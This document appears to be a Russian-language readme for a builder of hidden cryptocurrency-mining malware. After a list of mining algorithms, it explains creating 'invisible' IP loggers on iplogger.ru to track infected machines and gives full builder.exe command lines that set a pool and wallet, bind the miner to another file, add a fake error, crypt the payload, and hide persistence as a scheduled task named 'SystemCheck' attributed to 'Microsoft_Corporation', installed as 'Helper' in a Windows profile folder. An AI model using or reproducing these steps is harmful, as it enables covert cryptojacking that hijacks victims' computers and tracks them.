Algo - можно оставить пустым. Будет по дефолту майнить тот алгоритм, на котором Монеро.
cn/upx2         CryptoNight-Femto (variant of CryptoNight V2 for Uplexa).	
argon2/chukwav2	Argon2id (Chukwa v2).	CPU only
cn/ccx          Conceal (CCX)	
kawpow          KawPow (Ravencoin)	GPU only, not supported by xmrig-proxy
rx/keva         RandomKEVA (RandomX variant for Keva).	
astrobw         AstroBWT (Dero).
astrobwt/v2     AstroBWT (Dero HE).	
cn-pico/tlo     CryptoNight-Pico (Talleo).	
rx/sfx          RandomSFX (RandomX variant for Safex).	
rx/arq          RandomARQ (RandomX variant for ArQmA).	
rx/0            RandomX (Monero).	
argon2/chukwa   Argon2id (Chukwa).	CPU only
argon2/ninja    Argon2id (NINJA)	CPU only
rx/wow          RandomWOW (RandomX variant for Wownero).	
cn/fast         CryptoNight variant 1 with half iterations.	
cn/rwz          CryptoNight variant 2 with 3/4 iterations and reversed shuffle operation.	
cn/zls          CryptoNight variant 2 with 3/4 iterations.	
cn/double       CryptoNight variant 2 with double iterations.	
cn/r            CryptoNightR (Monero's variant 4).	
cn-pico         CryptoNight-Pico.	
cn/half         CryptoNight variant 2 with half iterations.	
cn/2            CryptoNight variant 2.	
cn/xao          CryptoNight variant 0 (modified).	
cn/rto          CryptoNight variant 1 (modified).	
cn-heavy/tube   CryptoNight-Heavy (modified).	
cn-heavy/xhv    CryptoNight-Heavy (modified).	
cn-heavy/0      CryptoNight-Heavy.	
cn/1            CryptoNight variant 1.	
cn-lite/1       CryptoNight-Lite variant 1.	
cn-lite/0       CryptoNight-Lite variant 0.	
cn/0            CryptoNight (original).
gr              GhostRider (Raptoreum).

Логгеры.
Создаем "невидимый логгер" на https://iplogger.ru/ , получится адрес "https://2no.co/16Sxt7", берем 16Sxt7 и вставляем в нужный логгер.

del.bat - для удаления установленной сборки

============================================================

Также билдер работает через консоль. Открываем cmd.exe, перетаскиваем туда builder.exe и через пробел пишем параметры для билдинга сборки.
Пример:

builder.exe -algo'' -pool'stratum+tcp://pool.com:3333' -wallet'123' -load'50' -idleload'50' -loggerSa'2no.co' -loggerS'' -loggerRa'2no.co' -loggerR'' -loggerWa'2no.co' -loggerW'' -ico'' -glue'' -error'' -worker'' -icrypt'' -sremoval'' -ntask'SystemCheck' -ptask'System\' -atask'Microsoft_Corporation' -dtask'Starts_a_system_diagnostics_application_to_scan_for_errors_and_performance_problems.' -pinstall'Roaming\Microsoft\Windows\' -ninstall'Helper' -sinstall'-SystemCheck'

или

builder.exe -algo'' -pool'stratum+tcp://pool.com:3333' -wallet'123' -load'50' -idleload'100' -loggerSa'2no.co' -loggerS'1dajJD' -loggerRa'2no.co' -loggerR'2dajJD' -loggerWa'2no.co' -loggerW'3dajJD' -ico'name' -glue'name' -error'1' -worker'1' -icrypt'1' -sremoval'1' -ntask'SystemCheck' -ptask'System\' -atask'Microsoft_Corporation' -dtask'Starts_a_system_diagnostics_application_to_scan_for_errors_and_performance_problems.' -pinstall'Roaming\Microsoft\Windows\' -ninstall'Helper' -sinstall'-SystemCheck'

-worker'' - без имени воркера
-worker'1' - имя воркера будет через точку после кошелька (-u wallet.NAME)
-worker'2' - имя воркера будет в пароле (-p xNAME)

*Вместо пробела ставится "_" (нижнее подчеркивание). В таких параметрах, как например "Описание задачи".

============================================================

*Если у вас низкая скорость добычи, то скорее всего вы майните на криптонайт алгоритме на пуле и нужно принудительно тогда  указать RandomX алгоритм.